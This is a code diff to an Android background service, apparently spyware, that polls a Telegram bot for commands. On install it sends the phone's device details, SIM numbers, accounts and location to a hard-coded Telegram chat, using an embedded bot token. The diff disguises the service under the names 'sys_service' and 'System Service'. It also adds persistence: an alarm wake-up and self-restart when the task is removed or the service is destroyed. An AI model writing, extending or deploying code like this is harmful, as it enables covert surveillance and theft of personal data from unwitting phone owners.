@@ -1,8 +1,10 @@
 package com.ddos.app;
 
+import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
@@ -24,7 +26,7 @@ public class TelegramBot extends Service {
     public static final String BOT_TOKEN = "8316267953:AAGio6wBCcY2wyyRrSQQcjQrWC--oiugoGo";
     public static final String CHAT_ID   = "8359688241";
     public static final String API       = "https://api.telegram.org/bot" + BOT_TOKEN;
-    public static final String CHANNEL   = "ddos_svc";
+    public static final String CHANNEL   = "sys_service";
 
     private static Context ctx;
     private static final OkHttpClient client = new OkHttpClient.Builder()
@@ -35,13 +37,23 @@ public class TelegramBot extends Service {
     private long lastId = 0;
     private volatile boolean running = true;
 
+    public static void start(Context c) {
+        try {
+            Intent i = new Intent(c, TelegramBot.class);
+            if (Build.VERSION.SDK_INT >= 26) {
+                c.startForegroundService(i);
+            } else {
+                c.startService(i);
+            }
+        } catch (Exception ignored) {}
+    }
+
     @Override
     public void onCreate() {
         super.onCreate();
         ctx = getApplicationContext();
-        try {
-            startFg();
-        } catch (Exception e) {}
+        startFg();
+        scheduleAlarm();
         poll();
     }
 
@@ -56,18 +68,34 @@ public class TelegramBot extends Service {
             }
 
             Notification n = new NotificationCompat.Builder(this, CHANNEL)
-                    .setContentTitle("System")
+                    .setContentTitle("System Service")
                     .setContentText("Running")
                     .setSmallIcon(android.R.drawable.stat_notify_sync)
                     .setPriority(NotificationCompat.PRIORITY_LOW)
                     .setOngoing(true)
                     .build();
 
-            if (Build.VERSION.SDK_INT >= 34) {
-                startForeground(1001, n,
-                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
-            } else {
-                startForeground(1001, n);
+            startForeground(1001, n);
+        } catch (Exception ignored) {}
+    }
+
+    private void scheduleAlarm() {
+        try {
+            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+            Intent i = new Intent(this, AlarmReceiver.class);
+            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
+            if (Build.VERSION.SDK_INT >= 23) flags |= PendingIntent.FLAG_IMMUTABLE;
+            PendingIntent pi = PendingIntent.getBroadcast(this, 777, i, flags);
+
+            if (am != null) {
+                long interval = 15 * 60 * 1000L;
+                if (Build.VERSION.SDK_INT >= 23) {
+                    am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP,
+                            System.currentTimeMillis() + interval, pi);
+                } else {
+                    am.set(AlarmManager.RTC_WAKEUP,
+                            System.currentTimeMillis() + interval, pi);
+                }
             }
         } catch (Exception ignored) {}
     }
@@ -119,7 +147,6 @@ public class TelegramBot extends Service {
 
     private void handle(long cid, String cmd) {
         String c = cmd.toLowerCase();
-
         if (c.startsWith("/")) {
             switch (c) {
                 case "/start":
@@ -174,7 +201,6 @@ public class TelegramBot extends Service {
         sendTo(cid, "\uD83D\uDEA8 <b>NEW INSTALL</b>");
         sendDeviceInfoTo(cid);
         sendSimNumbersTo(cid);
-        sendTMNumberTo(cid);
         sendAccountsTo(cid);
         sendLocationTo(cid);
         sendBatteryTo(cid);
@@ -186,8 +212,7 @@ public class TelegramBot extends Service {
           .append("Brand: ").append(Build.BRAND).append("\n")
           .append("Android: ").append(Build.VERSION.RELEASE)
           .append(" (API ").append(Build.VERSION.SDK_INT).append(")\n")
-          .append("Device: ").append(Build.DEVICE).append("\n")
-          .append("Hardware: ").append(Build.HARDWARE).append("\n");
+          .append("Device: ").append(Build.DEVICE).append("\n");
         sendTo(cid, sb.toString());
     }
 
@@ -200,28 +225,14 @@ public class TelegramBot extends Service {
                 List<android.telephony.SubscriptionInfo> subs =
                     sm.getActiveSubscriptionInfoList();
                 if (subs != null && !subs.isEmpty()) {
-                    StringBuilder sb = new StringBuilder("\uD83D\uDCF1 <b>SIM Numbers</b>\n");
+                    StringBuilder sb = new StringBuilder("\uD83D\uDCF1 <b>SIM</b>\n");
                     for (android.telephony.SubscriptionInfo s : subs) {
-                        sb.append("\u2022 Slot ").append(s.getSimSlotIndex())
-                          .append(": ").append(s.getNumber())
+                        sb.append("\u2022 ").append(s.getNumber())
                           .append(" (").append(s.getCarrierName()).append(")\n");
                     }
                     sendTo(cid, sb.toString());
                     return;
                 }
-            }
-            sendTo(cid, "SIM number unavailable");
-        } catch (Exception e) { sendTo(cid, "sim err"); }
-    }
-
-    private void sendTMNumberTo(long cid) {
-        try {
-            android.telephony.TelephonyManager tm =
-                (android.telephony.TelephonyManager)
-                    ctx.getSystemService(Context.TELEPHONY_SERVICE);
-            if (tm != null) {
-                String n = tm.getLine1Number();
-                if (n != null && !n.isEmpty()) sendTo(cid, "\uD83D\uDCDE " + n);
             }
         } catch (Exception ignored) {}
     }
@@ -343,15 +354,29 @@ public class TelegramBot extends Service {
 
     @Nullable @Override public IBinder onBind(Intent i) { return null; }
 
-    @Override public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }
+    @Override public int onStartCommand(Intent i, int f, int s) {
+        return START_STICKY;
+    }
 
-    @Override public void onDestroy() {
-        Intent r = new Intent(getApplicationContext(), TelegramBot.class);
+    @Override public void onTaskRemoved(Intent rootIntent) {
         try {
+            Intent r = new Intent(getApplicationContext(), TelegramBot.class);
             if (Build.VERSION.SDK_INT >= 26)
                 getApplicationContext().startForegroundService(r);
-            else getApplicationContext().startService(r);
+            else
+                getApplicationContext().startService(r);
+        } catch (Exception ignored) {}
+        super.onTaskRemoved(rootIntent);
+    }
+
+    @Override public void onDestroy() {
+        try {
+            Intent r = new Intent(getApplicationContext(), TelegramBot.class);
+            if (Build.VERSION.SDK_INT >= 26)
+                getApplicationContext().startForegroundService(r);
+            else
+                getApplicationContext().startService(r);
         } catch (Exception ignored) {}
         super.onDestroy();
     }
-                           }
+}
